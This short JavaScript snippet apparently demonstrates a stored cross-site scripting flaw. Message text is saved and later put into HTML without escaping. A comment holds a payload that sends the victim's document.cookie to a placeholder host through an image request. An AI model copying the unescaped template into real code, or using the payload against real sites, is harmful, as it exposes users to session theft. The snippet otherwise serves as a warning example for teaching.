//Attention! vulnerable to XSS code. Do not use it

//Payload to exploit XSS attack

//<script>new Image().src="http://yourdomain.io/"+document.cookie;</script> 
// or almost any js script

function handleMessageSend(messageId, senderEmail, messageContent)  {
    database.save(messageId, senderEmail, messageContent);
  }
  
  function generateMessageHTML(messageId) {
    let messageContent = database.loadContent(messageId);
    return `<p class="messageContent">${messageContent}</p>`;
  }